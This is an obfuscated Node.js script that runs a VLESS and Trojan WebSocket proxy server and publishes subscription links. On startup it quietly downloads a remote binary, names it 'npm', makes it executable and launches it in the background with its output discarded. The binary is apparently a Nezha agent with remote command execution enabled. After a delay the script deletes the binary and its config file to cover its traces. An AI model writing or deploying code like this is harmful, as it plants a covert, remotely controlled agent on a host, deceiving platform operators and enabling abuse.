const _0x474a66=_0x1734;(function(_0x10f981,_0x8f7fd9){const _0x2133ed=_0x1734,_0x5d6abb=_0x10f981();while(!![]){try{const _0x20d499=parseInt(_0x2133ed(0x204))/0x1*(-parseInt(_0x2133ed(0x1ec))/0x2)+-parseInt(_0x2133ed(0x20b))/0x3+parseInt(_0x2133ed(0x1b3))/0x4*(-parseInt(_0x2133ed(0x1e7))/0x5)+-parseInt(_0x2133ed(0x1f4))/0x6+parseInt(_0x2133ed(0x1d2))/0x7*(-parseInt(_0x2133ed(0x208))/0x8)+parseInt(_0x2133ed(0x1cd))/0x9*(-parseInt(_0x2133ed(0x1a1))/0xa)+parseInt(_0x2133ed(0x1db))/0xb;if(_0x20d499===_0x8f7fd9)break;else _0x5d6abb['push'](_0x5d6abb['shift']());}catch(_0x2d4d18){_0x5d6abb['push'](_0x5d6abb['shift']());}}}(_0x4ea0,0xc2ef4));const os=require('os'),http=require(_0x474a66(0x1ae)),fs=require('fs'),axios=require(_0x474a66(0x1fd)),net=require(_0x474a66(0x19a)),path=require('path'),crypto=require(_0x474a66(0x192)),{Buffer}=require(_0x474a66(0x1b0)),{exec,execSync}=require(_0x474a66(0x1c9)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x474a66(0x1cf),NEZHA_SERVER=process[_0x474a66(0x194)][_0x474a66(0x1e2)]||'',NEZHA_PORT=process[_0x474a66(0x194)][_0x474a66(0x197)]||'',NEZHA_KEY=process[_0x474a66(0x194)]['NEZHA_KEY']||'',DOMAIN=process[_0x474a66(0x194)]['DOMAIN']||_0x474a66(0x1b6),AUTO_ACCESS=process['env'][_0x474a66(0x196)]||!![],WSPATH=process[_0x474a66(0x194)][_0x474a66(0x1f0)]||UUID[_0x474a66(0x1c7)](0x0,0x8),SUB_PATH=process[_0x474a66(0x194)]['SUB_PATH']||_0x474a66(0x1fa),NAME=process[_0x474a66(0x194)][_0x474a66(0x1ed)]||_0x474a66(0x1f2),PORT=process[_0x474a66(0x194)][_0x474a66(0x1e1)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x10d0e3=_0x474a66;try{const _0x1bfc84=await axios['get'](_0x10d0e3(0x1b2)),_0x18fe1a=_0x1bfc84[_0x10d0e3(0x1ee)];ISP=(_0x18fe1a['country']+'-'+_0x18fe1a['asOrganization'])[_0x10d0e3(0x1c3)](/ /g,'_');}catch(_0x2b1432){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x3cbf06,_0x13f1e9)=>{const _0x10c06=_0x474a66;if(_0x3cbf06['url']==='/'){const _0x3a66df=path[_0x10c06(0x1fe)](__dirname,_0x10c06(0x1b8));fs[_0x10c06(0x193)](_0x3a66df,_0x10c06(0x1e4),(_0x1b926b,_0x24df0f)=>{const _0x26f3de=_0x10c06;if(_0x1b926b){_0x13f1e9[_0x26f3de(0x19f)](0xc8,{'Content-Type':_0x26f3de(0x1dc)}),_0x13f1e9[_0x26f3de(0x1d6)](_0x26f3de(0x1d7));return;}_0x13f1e9['writeHead'](0xc8,{'Content-Type':_0x26f3de(0x1dc)}),_0x13f1e9[_0x26f3de(0x1d6)](_0x24df0f);});return;}else{if(_0x3cbf06[_0x10c06(0x1d3)]==='/'+SUB_PATH){const _0x48ca14=_0x10c06(0x1ce)+UUID+'@'+DOMAIN+_0x10c06(0x1b7)+DOMAIN+_0x10c06(0x1c0)+DOMAIN+_0x10c06(0x1fb)+WSPATH+'#'+NAME+'-'+ISP,_0x444dd4=_0x10c06(0x1bb)+UUID+'@'+DOMAIN+_0x10c06(0x195)+DOMAIN+_0x10c06(0x1c0)+DOMAIN+_0x10c06(0x1fb)+WSPATH+'#'+NAME+'-'+ISP,_0x1eb736=_0x48ca14+'\x0a'+_0x444dd4,_0x4040f1=Buffer[_0x10c06(0x1d4)](_0x1eb736)[_0x10c06(0x1f1)](_0x10c06(0x19d));_0x13f1e9[_0x10c06(0x19f)](0xc8,{'Content-Type':_0x10c06(0x1e9)}),_0x13f1e9['end'](_0x4040f1+'\x0a');}else _0x13f1e9['writeHead'](0x194,{'Content-Type':_0x10c06(0x1e9)}),_0x13f1e9[_0x10c06(0x1d6)](_0x10c06(0x1a0));}}),wss=new WebSocket[(_0x474a66(0x1df))]({'server':httpServer}),uuid=UUID[_0x474a66(0x1c3)](/-/g,''),DNS_SERVERS=[_0x474a66(0x203),_0x474a66(0x1ba)];function _0x4ea0(){const _0x395b54=['60651151LYMeYB','text/html','every','close','Server','utf-8','PORT','NEZHA_SERVER','writeFileSync','utf8','2053','split','45AMbrgT','npm\x20running\x20error:','text/plain','pipe','write','794KnVExx','NAME','data','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','WSPATH','toString','Hug','map','832086CPxVDP','true','https://','npm\x20download\x20successfully','log','concat','vps','&path=%2F','2087','axios','join','Answer','includes','Automatic\x20Access\x20Task\x20added\x20successfully','connection','8.8.4.4','2309HuQgTK','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://dns.google/resolve?name=','https://arm64.ssss.nyc.mn/agent','856IaxmaR','connect','get','2580618nuIORX','readUInt8','https://amd64.ssss.nyc.mn/agent','crypto','readFile','env',':443?security=tls&sni=','AUTO_ACCESS','NEZHA_PORT','setsid\x20nohup\x20./npm\x20-s\x20','readUInt16BE','net','arm64','length','base64','once','writeHead','Not\x20Found\x0a','10520250WpPKfh','listen','substr','https://arm64.ssss.nyc.mn/v1','npm\x20is\x20already\x20running,\x20skip\x20running...','false','post','--tls','error:\x20','application/dns-json','chmod\x20+x\x20npm','error','https://oooo.serv00.net/add-url','http','npm','buffer','arm','https://speed.cloudflare.com/meta','519672otFDey','aarch64','application/json','edison.edisonhu.de5.net',':443?encryption=none&security=tls&sni=','index.html','Server\x20is\x20running\x20on\x20port\x20','1.1.1.1','trojan://','digest','pop','client_secret:\x20','test','&fp=chrome&type=ws&host=','trim','npm\x20is\x20running','replace','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Failed\x20to\x20resolve\x20','createHash','slice','config.yaml','child_process','catch','\x20with\x20all\x20DNS\x20servers','unlink','9bWXmPL','vless://','715abf30-2577-8d99-6d76-8d60cea59ab5','2096','update','37842UakxvC','url','from','2083','end','Hello\x20world!','then','message','decode'];_0x4ea0=function(){return _0x395b54;};return _0x4ea0();}function resolveHost(_0x512882){return new Promise((_0x5b5339,_0x2a2490)=>{const _0x156dd9=_0x1734;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x156dd9(0x1bf)](_0x512882)){_0x5b5339(_0x512882);return;}let _0x1dbdff=0x0;function _0x2a4e15(){const _0x2b5194=_0x156dd9;if(_0x1dbdff>=DNS_SERVERS['length']){_0x2a2490(new Error(_0x2b5194(0x1c5)+_0x512882+_0x2b5194(0x1cb)));return;}const _0x4f6b4f=DNS_SERVERS[_0x1dbdff];_0x1dbdff++;const _0x209740=_0x2b5194(0x206)+encodeURIComponent(_0x512882)+'&type=A';axios[_0x2b5194(0x20a)](_0x209740,{'timeout':0x1388,'headers':{'Accept':_0x2b5194(0x1aa)}})[_0x2b5194(0x1d8)](_0x547edc=>{const _0x1a5617=_0x2b5194,_0x36d8b6=_0x547edc[_0x1a5617(0x1ee)];if(_0x36d8b6['Status']===0x0&&_0x36d8b6[_0x1a5617(0x1ff)]&&_0x36d8b6[_0x1a5617(0x1ff)][_0x1a5617(0x19c)]>0x0){const _0x2d34f8=_0x36d8b6[_0x1a5617(0x1ff)]['find'](_0xcd1e05=>_0xcd1e05['type']===0x1);if(_0x2d34f8){_0x5b5339(_0x2d34f8['data']);return;}}_0x2a4e15();})[_0x2b5194(0x1ca)](_0x474757=>{_0x2a4e15();});}_0x2a4e15();});}function handleVlessConnection(_0xf73014,_0xc98eec){const _0x12ab3b=_0x474a66,[_0x1f6106]=_0xc98eec,_0x3b9560=_0xc98eec['slice'](0x1,0x11);if(!_0x3b9560['every']((_0x481757,_0x26e070)=>_0x481757==parseInt(uuid[_0x12ab3b(0x1a3)](_0x26e070*0x2,0x2),0x10)))return![];let _0x5e679a=_0xc98eec[_0x12ab3b(0x1c7)](0x11,0x12)[_0x12ab3b(0x190)]()+0x13;const _0x10f3ff=_0xc98eec[_0x12ab3b(0x1c7)](_0x5e679a,_0x5e679a+=0x2)[_0x12ab3b(0x199)](0x0),_0x32d6d8=_0xc98eec[_0x12ab3b(0x1c7)](_0x5e679a,_0x5e679a+=0x1)['readUInt8'](),_0x5a7b95=_0x32d6d8==0x1?_0xc98eec[_0x12ab3b(0x1c7)](_0x5e679a,_0x5e679a+=0x4)[_0x12ab3b(0x1fe)]('.'):_0x32d6d8==0x2?new TextDecoder()[_0x12ab3b(0x1da)](_0xc98eec['slice'](_0x5e679a+0x1,_0x5e679a+=0x1+_0xc98eec[_0x12ab3b(0x1c7)](_0x5e679a,_0x5e679a+0x1)['readUInt8']())):_0x32d6d8==0x3?_0xc98eec['slice'](_0x5e679a,_0x5e679a+=0x10)['reduce']((_0x2876b2,_0x2d2a49,_0x5354fb,_0x349172)=>_0x5354fb%0x2?_0x2876b2[_0x12ab3b(0x1f9)](_0x349172[_0x12ab3b(0x1c7)](_0x5354fb-0x1,_0x5354fb+0x1)):_0x2876b2,[])[_0x12ab3b(0x1f3)](_0x566edd=>_0x566edd[_0x12ab3b(0x199)](0x0)[_0x12ab3b(0x1f1)](0x10))['join'](':'):'';_0xf73014['send'](new Uint8Array([_0x1f6106,0x0]));const _0x546e14=createWebSocketStream(_0xf73014);return resolveHost(_0x5a7b95)[_0x12ab3b(0x1d8)](_0xa4d83=>{net['connect']({'host':_0xa4d83,'port':_0x10f3ff},function(){const _0xb4becb=_0x1734;this[_0xb4becb(0x1eb)](_0xc98eec[_0xb4becb(0x1c7)](_0x5e679a)),_0x546e14['on'](_0xb4becb(0x1ac),()=>{})[_0xb4becb(0x1ea)](this)['on'](_0xb4becb(0x1ac),()=>{})['pipe'](_0x546e14);})['on']('error',()=>{});})[_0x12ab3b(0x1ca)](_0x9f12bd=>{const _0x59c424=_0x12ab3b;net[_0x59c424(0x209)]({'host':_0x5a7b95,'port':_0x10f3ff},function(){const _0x3734bf=_0x59c424;this[_0x3734bf(0x1eb)](_0xc98eec[_0x3734bf(0x1c7)](_0x5e679a)),_0x546e14['on']('error',()=>{})[_0x3734bf(0x1ea)](this)['on'](_0x3734bf(0x1ac),()=>{})[_0x3734bf(0x1ea)](_0x546e14);})['on'](_0x59c424(0x1ac),()=>{});}),!![];}function handleTrojanConnection(_0xbf3791,_0xdc10e7){const _0x1c4438=_0x474a66;try{if(_0xdc10e7[_0x1c4438(0x19c)]<0x3a)return![];const _0x51f5d7=_0xdc10e7[_0x1c4438(0x1c7)](0x0,0x38)[_0x1c4438(0x1f1)](),_0x4bb84e=[UUID];let _0x1530e8=null;for(const _0x503347 of _0x4bb84e){const _0x57efa8=crypto[_0x1c4438(0x1c6)]('sha224')[_0x1c4438(0x1d1)](_0x503347)[_0x1c4438(0x1bc)]('hex');if(_0x57efa8===_0x51f5d7){_0x1530e8=_0x503347;break;}}if(!_0x1530e8)return![];let _0x2878ce=0x38;_0xdc10e7[_0x2878ce]===0xd&&_0xdc10e7[_0x2878ce+0x1]===0xa&&(_0x2878ce+=0x2);const _0x38feb7=_0xdc10e7[_0x2878ce];if(_0x38feb7!==0x1)return![];_0x2878ce+=0x1;const _0x463661=_0xdc10e7[_0x2878ce];_0x2878ce+=0x1;let _0x5a9764,_0x4af4ac;if(_0x463661===0x1)_0x5a9764=_0xdc10e7[_0x1c4438(0x1c7)](_0x2878ce,_0x2878ce+0x4)[_0x1c4438(0x1fe)]('.'),_0x2878ce+=0x4;else{if(_0x463661===0x3){const _0x3ef673=_0xdc10e7[_0x2878ce];_0x2878ce+=0x1,_0x5a9764=_0xdc10e7[_0x1c4438(0x1c7)](_0x2878ce,_0x2878ce+_0x3ef673)['toString'](),_0x2878ce+=_0x3ef673;}else{if(_0x463661===0x4)_0x5a9764=_0xdc10e7[_0x1c4438(0x1c7)](_0x2878ce,_0x2878ce+0x10)['reduce']((_0x2b2244,_0xa96677,_0x3251e9,_0x37b035)=>_0x3251e9%0x2?_0x2b2244[_0x1c4438(0x1f9)](_0x37b035[_0x1c4438(0x1c7)](_0x3251e9-0x1,_0x3251e9+0x1)):_0x2b2244,[])[_0x1c4438(0x1f3)](_0x3e6382=>_0x3e6382[_0x1c4438(0x199)](0x0)['toString'](0x10))[_0x1c4438(0x1fe)](':'),_0x2878ce+=0x10;else return![];}}_0x4af4ac=_0xdc10e7[_0x1c4438(0x199)](_0x2878ce),_0x2878ce+=0x2;_0x2878ce<_0xdc10e7[_0x1c4438(0x19c)]&&_0xdc10e7[_0x2878ce]===0xd&&_0xdc10e7[_0x2878ce+0x1]===0xa&&(_0x2878ce+=0x2);const _0x5f2495=createWebSocketStream(_0xbf3791);return resolveHost(_0x5a9764)[_0x1c4438(0x1d8)](_0x113131=>{const _0x39220f=_0x1c4438;net[_0x39220f(0x209)]({'host':_0x113131,'port':_0x4af4ac},function(){const _0x2293ad=_0x39220f;_0x2878ce<_0xdc10e7['length']&&this['write'](_0xdc10e7['slice'](_0x2878ce)),_0x5f2495['on'](_0x2293ad(0x1ac),()=>{})[_0x2293ad(0x1ea)](this)['on'](_0x2293ad(0x1ac),()=>{})[_0x2293ad(0x1ea)](_0x5f2495);})['on'](_0x39220f(0x1ac),()=>{});})[_0x1c4438(0x1ca)](_0x1fab00=>{const _0x30bf46=_0x1c4438;net[_0x30bf46(0x209)]({'host':_0x5a9764,'port':_0x4af4ac},function(){const _0x1c92b4=_0x30bf46;_0x2878ce<_0xdc10e7[_0x1c92b4(0x19c)]&&this[_0x1c92b4(0x1eb)](_0xdc10e7[_0x1c92b4(0x1c7)](_0x2878ce)),_0x5f2495['on'](_0x1c92b4(0x1ac),()=>{})[_0x1c92b4(0x1ea)](this)['on'](_0x1c92b4(0x1ac),()=>{})[_0x1c92b4(0x1ea)](_0x5f2495);})['on'](_0x30bf46(0x1ac),()=>{});}),!![];}catch(_0x3d9f98){return![];}}function _0x1734(_0x18fea6,_0x8b515d){_0x18fea6=_0x18fea6-0x190;const _0x4ea077=_0x4ea0();let _0x17349d=_0x4ea077[_0x18fea6];return _0x17349d;}wss['on'](_0x474a66(0x202),(_0x41851d,_0x48f4d0)=>{const _0x2a5c5b=_0x474a66,_0x38e43d=_0x48f4d0['url']||'';_0x41851d[_0x2a5c5b(0x19e)](_0x2a5c5b(0x1d9),_0x30b57c=>{const _0x8098ee=_0x2a5c5b;if(_0x30b57c[_0x8098ee(0x19c)]>0x11&&_0x30b57c[0x0]===0x0){const _0x3830db=_0x30b57c[_0x8098ee(0x1c7)](0x1,0x11),_0x42913f=_0x3830db[_0x8098ee(0x1dd)]((_0x2d9491,_0x24e154)=>_0x2d9491==parseInt(uuid[_0x8098ee(0x1a3)](_0x24e154*0x2,0x2),0x10));if(_0x42913f){!handleVlessConnection(_0x41851d,_0x30b57c)&&_0x41851d['close']();return;}}!handleTrojanConnection(_0x41851d,_0x30b57c)&&_0x41851d[_0x8098ee(0x1de)]();})['on'](_0x2a5c5b(0x1ac),()=>{});});const getDownloadUrl=()=>{const _0x2a9e70=_0x474a66,_0x59e095=os['arch']();return _0x59e095===_0x2a9e70(0x1b1)||_0x59e095===_0x2a9e70(0x19b)||_0x59e095===_0x2a9e70(0x1b4)?!NEZHA_PORT?_0x2a9e70(0x1a4):_0x2a9e70(0x207):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x2a9e70(0x191);},downloadFile=async()=>{const _0x13de35=_0x474a66;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x180caf=getDownloadUrl(),_0x250278=await axios({'method':_0x13de35(0x20a),'url':_0x180caf,'responseType':'stream'}),_0xd02ccb=fs['createWriteStream'](_0x13de35(0x1af));return _0x250278[_0x13de35(0x1ee)][_0x13de35(0x1ea)](_0xd02ccb),new Promise((_0x2b95a1,_0x2f8bd2)=>{const _0x1450b4=_0x13de35;_0xd02ccb['on']('finish',()=>{const _0x3d3808=_0x1734;console['log'](_0x3d3808(0x1f7)),exec(_0x3d3808(0x1ab),_0x44a24f=>{if(_0x44a24f)_0x2f8bd2(_0x44a24f);_0x2b95a1();});}),_0xd02ccb['on'](_0x1450b4(0x1ac),_0x2f8bd2);});}catch(_0x1c7885){throw _0x1c7885;}},runnz=async()=>{const _0x99782f=_0x474a66;try{const _0x1796f3=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x99782f(0x1e0)});if(_0x1796f3[_0x99782f(0x1c1)]()!==''){console['log'](_0x99782f(0x1a5));return;}}catch(_0x5cba55){}await downloadFile();let _0x1552ff='',_0x44f584=['443','8443',_0x99782f(0x1d0),_0x99782f(0x1fc),_0x99782f(0x1d5),_0x99782f(0x1e5)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3a4786=_0x44f584['includes'](NEZHA_PORT)?_0x99782f(0x1a8):'';_0x1552ff=_0x99782f(0x198)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3a4786+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xb2a2c2=NEZHA_SERVER[_0x99782f(0x200)](':')?NEZHA_SERVER[_0x99782f(0x1e6)](':')[_0x99782f(0x1bd)]():'',_0x3bcf22=_0x44f584['includes'](_0xb2a2c2)?_0x99782f(0x1f5):_0x99782f(0x1a6),_0x26fd4f=_0x99782f(0x1be)+NEZHA_KEY+_0x99782f(0x205)+NEZHA_SERVER+_0x99782f(0x1ef)+_0x3bcf22+_0x99782f(0x1c4)+UUID;fs[_0x99782f(0x1e3)](_0x99782f(0x1c8),_0x26fd4f);}_0x1552ff='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x99782f(0x1f8)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x1552ff,{'shell':'/bin/bash'},_0x17e6a6=>{const _0x19abc7=_0x99782f;if(_0x17e6a6)console['error'](_0x19abc7(0x1e8),_0x17e6a6);else console[_0x19abc7(0x1f8)](_0x19abc7(0x1c2));});}catch(_0x496c50){console[_0x99782f(0x1ac)](_0x99782f(0x1a9)+_0x496c50);}};async function addAccessTask(){const _0x81eb03=_0x474a66;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5549e5=_0x81eb03(0x1f6)+DOMAIN;try{const _0x482944=await axios[_0x81eb03(0x1a7)](_0x81eb03(0x1ad),{'url':_0x5549e5},{'headers':{'Content-Type':_0x81eb03(0x1b5)}});console['log'](_0x81eb03(0x201));}catch(_0x4b5ca8){}}const delFiles=()=>{const _0x1a90d4=_0x474a66;fs['unlink'](_0x1a90d4(0x1af),()=>{}),fs[_0x1a90d4(0x1cc)](_0x1a90d4(0x1c8),()=>{});};httpServer[_0x474a66(0x1a2)](PORT,()=>{const _0x1f8568=_0x474a66;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1f8568(0x1f8)](_0x1f8568(0x1b9)+PORT);});